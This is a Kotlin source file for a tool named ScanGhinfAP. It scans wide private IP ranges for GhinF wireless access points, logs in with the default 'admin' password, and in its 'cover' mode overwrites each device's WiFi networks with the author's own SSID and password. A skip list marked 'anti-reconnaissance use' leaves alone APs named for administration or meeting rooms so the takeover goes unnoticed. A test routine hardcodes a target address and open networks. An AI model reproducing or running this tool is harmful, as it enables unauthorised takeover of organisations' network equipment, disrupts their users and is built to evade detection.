package ltd.lths.wireless.ghinf.ap

import joptsimple.OptionParser
import ltd.lths.wireless.ghinf.ap.api.toIPv4
import ltd.lths.wireless.ghinf.ap.util.IPv4
import ltd.lths.wireless.ghinf.ap.util.SSID
import trplugins.menu.util.concurrent.TaskConcurrent
import java.util.concurrent.CompletableFuture

/**
 * ScanGhinfAP
 * ltd.lths.wireless.ghinf.ap.Main
 *
 * @author Score2
 * @since 2022/04/01 22:35
 */
object Main {

    @JvmStatic
    fun main(args: Array<out String>) {
        val parser = object : OptionParser() {
            init {
                acceptsAll(listOf("?", "help"), "获取帮助")
                acceptsAll(listOf("ip", "ips"), "给定ip范围")
                    .withRequiredArg()
                    .ofType(String::class.java)
                    .defaultsTo("172.10-25.*.*")
                    .describedAs("ip段")
                acceptsAll(listOf("password", "pwd"), "自定义管理员密码")
                    .withRequiredArg()
                    .ofType(String::class.java)
                    .defaultsTo("admin")
                    .describedAs("管理员密码")
                acceptsAll(listOf("skip", "skips"), "跳过带有指定名称的ap, 反侦察专用")
                    .withRequiredArg()
                    .ofType(String::class.java)
                    .defaultsTo("行政,huiyishi,会议室,总")
                    .describedAs("名称")
                acceptsAll(listOf("wifi", "wlan"), "给定 WIFI 名称及密码, 用于覆盖")
                    .withRequiredArg()
                    .ofType(String::class.java)
                    .defaultsTo("score2@github.com/755466879")
                    .describedAs("名称/密码")
                acceptsAll(listOf("scan"), "扫描指定ip范围的Ghinf信息")
                acceptsAll(listOf("cover"), "自动覆盖指定范围内的GhinF AP的 WIFI")

                acceptsAll(listOf("test"), "随意调试")
            }
        }

        val options = kotlin.runCatching { parser.parse(*args) }.getOrElse { test(); return }

        if (options.has("?")) {
            parser.printHelpOn(System.out)
            return
        }

        if (options.has("test")) {
            test()
            return
        }

        println("ScanGhinfAP 运行中...")

        var ips: List<IPv4> = listOf(IPv4("172.10.0.1"))
        var password = "admin"
        var skips: List<String> = listOf()
        var ssids: List<SSID> = listOf()


        if (options.has("ip")) {
            println("正在遍历ip段...")
            ips = IPv4.from(options.valueOf("ip").toString()).toList()
            println("ip已生成 ${ips.size} 个")
        }
        if (options.has("pwd")) {
            password = options.valueOf("pwd").toString()
        }
        if (options.has("skip")) {
            skips = options.valueOf("skip").toString().split("\\s*,\\s*".toRegex())
        }
        if (options.has("wifi")) {
            ssids = options.valuesOf("wifi").toString().flatMap {
                val format = it.toString().split("/")
                listOf(
                    SSID(format[0], format.getOrNull(1) ?: "", SSID.Encryption.WPA2_PSK2, SSID.Frequency.WLAN_2G),
                    SSID(format[0], format.getOrNull(1) ?: "", SSID.Encryption.WPA2_PSK2, SSID.Frequency.WLAN_5G),
                )
            }
        }

        val ghinfaps = mutableMapOf<String, GhinfAP>()

        fun find(iPv4: IPv4): GhinfAP {
            val ap = GhinfAP.of(iPv4, password = password)
            val name = ap!!.deriveName
            ghinfaps[name] = ap
            println("找到GhinF AP 设备 ${ap.host}@$name")
            return ap
        }
        when {
            options.has("scan") -> {
                println("开始搜寻")

                ips.forEach {
                    if (!GhinfAP.idGhinfAP(it)) {
                        return@forEach
                    }
                    kotlin.runCatching { find(it) }
                }


            }
            options.has("cover") -> {
                println("开始地毯式覆盖 $ssids")
                println("过滤器: ${skips.joinToString()}")

                ips.forEach {
                    if (!GhinfAP.idGhinfAP(it)) {
                        return@forEach
                    }
                    kotlin.runCatching {
                        val ap = find(it)
                        if (skips.any { ap.deriveName.contains(it) }) {
                            println("    已跳过该 AP")
                            return
                        }
                        ap.ssids = ap.ssids.also {
                            it.removeIf { origin -> ssids.any { it.id == origin.id } }
                            it.forEach {
                                println("      ${it.id}<${it.frequency}> & ${it.encryption}")
                            }
                            ssids.forEach {
                                ap.addSsid(it)
                                println("    + ${it.id}<${it.frequency}> & ${it.encryption}")
                            }
                        }

                    }
                }
            }
        }


    }

    fun test() {
/*        File("ips.txt").printWriter().let { writer ->
            IPv4.from("172.10-25,30.*.*").forEach {
                writer.println(it.toString())
            }
        }*/
        GhinfAP.of("172.10.0.3", 6996)?.let {
            println(it.cookie)
            println(it.deriveName)
            println("SSID:")
            it.ssids = mutableListOf(
                SSID("iRongHuai-2G", "", SSID.Encryption.NONE, SSID.Frequency.WLAN_2G, false, 27),
                SSID("iRongHuai-5G", "", SSID.Encryption.NONE, SSID.Frequency.WLAN_5G, false, 27),
                SSID("score2@github.com", "17308930", SSID.Encryption.WPA2_PSK2, SSID.Frequency.WLAN_2G, false, 0),
                SSID("score2@github.com", "17308930", SSID.Encryption.WPA2_PSK2, SSID.Frequency.WLAN_5G, false, 0),
            )
            it.confirmSsids()

        }
    }

}